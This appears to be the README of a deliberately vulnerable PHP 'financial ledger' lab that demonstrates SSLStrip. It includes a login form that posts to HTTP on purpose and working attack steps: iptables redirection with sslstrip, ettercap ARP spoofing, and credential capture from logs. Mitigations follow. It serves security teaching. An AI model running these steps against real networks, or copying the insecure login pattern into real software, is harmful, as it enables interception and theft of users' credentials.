# BlueLedger - SSLStrip Vulnerability Demonstration

**⚠️ EDUCATIONAL PURPOSE ONLY**: This application contains deliberate security vulnerabilities for educational and research purposes. Never deploy in production environments.

## Overview

BlueLedger is a web application designed to demonstrate the SSLStrip attack vulnerability. It simulates a financial ledger system with a deliberately vulnerable login mechanism that can be exploited using SSLStrip.

## Vulnerability Details

### The SSLStrip Attack Vector

1. **Mixed HTTP/HTTPS Login**: The login page is served over HTTPS but posts credentials to HTTP
2. **No HSTS Header**: No Strict-Transport-Security header on the login page
3. **No Secure Cookie Flag**: Session cookies don't have the Secure flag initially
4. **No HTTP to HTTPS Redirect**: login.php accepts HTTP POST requests

### How the Attack Works

1. User connects to `https://blueledger.example.com/login.php` (secure)
2. Form posts to `http://blueledger.example.com/login.php` (insecure)
3. Attacker running SSLStrip intercepts the HTTP POST
4. Credentials are transmitted in plain text to the attacker
5. Attacker forwards the request to maintain the session

## Quick Start

### Prerequisites

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install apache2 mysql-server php libapache2-mod-php php-mysql
sudo apt install sslstrip ettercap-text-only

# Enable Apache modules
sudo a2enmod rewrite ssl headers
```

### Installation

```bash
# 1. Clone/download the project
git clone <repository-url> blueledger
cd blueledger

# 2. Set up the database
sudo mysql -u root -p
CREATE DATABASE blueledger;
CREATE USER 'blueledger'@'localhost' IDENTIFIED BY 'your_password';
GRANT ALL PRIVILEGES ON blueledger.* TO 'blueledger'@'localhost';
FLUSH PRIVILEGES;
EXIT;

# Import schema and data
mysql -u blueledger -p blueledger < data/blueledger.sql

# 3. Configure Apache
sudo cp apache-config/blueledger.conf /etc/apache2/sites-available/
sudo cp apache-config/blueledger-ssl.conf /etc/apache2/sites-available/
sudo a2ensite blueledger blueledger-ssl

# 4. Generate SSL certificate
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/ssl/private/blueledger.key \
    -out /etc/ssl/certs/blueledger.crt \
    -subj "/C=US/ST=State/L=City/O=Test/CN=blueledger.example.com"

# 5. Deploy application
sudo cp -r . /var/www/blueledger/
sudo chown -R www-data:www-data /var/www/blueledger
sudo chmod -R 755 /var/www/blueledger

# 6. Update configuration
sudo nano /var/www/blueledger/includes/config.php
# Update database credentials

# 7. Add to hosts file
echo "127.0.0.1 blueledger.example.com" | sudo tee -a /etc/hosts

# 8. Restart Apache
sudo systemctl restart apache2
```

## SSLStrip Attack Demonstration

### Method 1: Manual SSLStrip Attack

#### Terminal 1: Set up SSLStrip
```bash
# Enable IP forwarding
sudo sysctl net.ipv4.ip_forward=1

# Set up iptables redirect
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Start SSLStrip
sudo sslstrip -l 10000 -w sslstrip.log
```

#### Terminal 2: Monitor Traffic
```bash
# Watch the SSLStrip log for captured credentials
tail -f sslstrip.log
```

#### Terminal 3: Test the Attack
```bash
# Test login via HTTP (simulating the stripped connection)
curl -c cookies.txt -b cookies.txt -X POST \
    -d "username=admin&password=password" \
    http://blueledger.example.com/login.php \
    -v

# The credentials will appear in plain text in sslstrip.log
```

### Method 2: Ettercap + SSLStrip (Network Attack)

```bash
# 1. Find network interface and gateway
ip route | grep default
# Note your interface (e.g., eth0) and gateway IP

# 2. Start ARP spoofing (replace IPs as needed)
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# 3. In another terminal, start SSLStrip
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sudo sslstrip -l 10000 -w attack.log

# 4. Monitor captured credentials
tail -f attack.log
```

### Method 3: Simple Proof of Concept

```bash
# Direct demonstration of the vulnerability
echo "Testing SSLStrip vulnerability..."

# 1. Visit the HTTPS login page
curl -k https://blueledger.example.com/login.php > /dev/null

# 2. Post credentials to HTTP endpoint (what SSLStrip does)
curl -X POST -d "username=admin&password=secret123" \
    http://blueledger.example.com/login.php \
    -v 2>&1 | grep -E "(POST|username|password)"

echo "Credentials sent in plain text over HTTP!"
```

## Application Features

### User Management
- **Admin User**: admin / password
- **Regular Users**: carlos / password, maria / password
- Role-based access control

### Core Modules
- **Precursor Types**: Chemical compound management
- **Vendors**: Supplier information and contacts
- **Invoices**: Financial transaction records
- **Shipments**: Logistics and tracking
- **Expenses**: Cost management
- **Reports**: Financial analytics and charts

### Security Features (Post-Login)
- HSTS headers enabled after authentication
- Secure session cookies for authenticated sessions
- HTTPS-only access for all authenticated pages
- Prepared SQL statements
- XSS protection via output sanitization

## Understanding The Code

### Vulnerable Login Implementation

```php
// public/login.php - The vulnerable form
<form method="POST" action="http://blueledger.example.com/login.php">
    <!-- Form posts to HTTP, not HTTPS! -->
```

### Apache Configuration Vulnerability

```apache
# Port 80 vhost accepts login POST
<VirtualHost *:80>
    # VULNERABILITY: Accepts POST to login.php over HTTP
    RewriteCond %{REQUEST_URI} !^/login\.php
    # Only login.php is exempt from HTTPS redirect
</VirtualHost>
```

### Session Security After Login

```php
// After successful login, security is enabled
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
redirect('https://blueledger.example.com/dashboard.php');
```

## Mitigation Strategies

To fix the SSLStrip vulnerability:

1. **Always POST to HTTPS**
   ```html
   <form method="POST" action="https://blueledger.example.com/login.php">
   ```

2. **Implement HSTS from first visit**
   ```apache
   Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
   ```

3. **Force HTTPS redirect for ALL pages**
   ```apache
   RewriteEngine On
   RewriteCond %{HTTPS} off
   RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]
   ```

4. **Set Secure cookie flag**
   ```php
   ini_set('session.cookie_secure', 1);
   ```

5. **Implement HSTS preloading**
   Submit domain to HSTS preload list

## Educational Objectives

This demonstration teaches:

1. **Understanding SSLStrip**: How the attack works at a technical level
2. **Mixed Content Vulnerabilities**: Dangers of HTTP/HTTPS mixing
3. **Transport Security**: Importance of end-to-end encryption
4. **Security Headers**: Role of HSTS in attack prevention
5. **Secure Development**: Best practices for web application security

## Legal and Ethical Notice

This tool is intended for:
- Educational purposes in controlled environments
- Security research and testing
- Demonstrating vulnerabilities to development teams
- Training security professionals

**DO NOT USE** for:
- Attacking systems you don't own
- Unauthorized penetration testing
- Any illegal activities
- Production deployments

## Troubleshooting

### Common Issues

1. **SSL Certificate Warnings**
   - Expected with self-signed certificates
   - Add browser exception for testing

2. **Database Connection Errors**
   - Verify MySQL is running: `sudo systemctl status mysql`
   - Check credentials in `includes/config.php`

3. **Apache Permission Issues**
   - Ensure proper ownership: `sudo chown -R www-data:www-data /var/www/blueledger`
   - Check Apache error logs: `sudo tail -f /var/log/apache2/error.log`

4. **SSLStrip Not Capturing**
   - Verify iptables rules: `sudo iptables -t nat -L`
   - Check IP forwarding: `cat /proc/sys/net/ipv4/ip_forward`
   - Ensure SSLStrip is listening: `netstat -tlnp | grep 10000`

### Verification Commands

```bash
# Test HTTPS login page loads
curl -k -I https://blueledger.example.com/login.php

# Test HTTP login accepts POST
curl -X POST -d "test=data" http://blueledger.example.com/login.php -I

# Verify SSLStrip is working
curl -x http://localhost:10000 http://blueledger.example.com/login.php
```

## Additional Resources

- [SSLStrip Paper by Moxie Marlinspike](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)
- [OWASP HSTS Documentation](https://owasp.org/www-community/Security_Headers)
- [Mozilla Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)

---

**Remember**: This is a deliberately vulnerable application. Use responsibly and only in controlled environments for educational purposes.
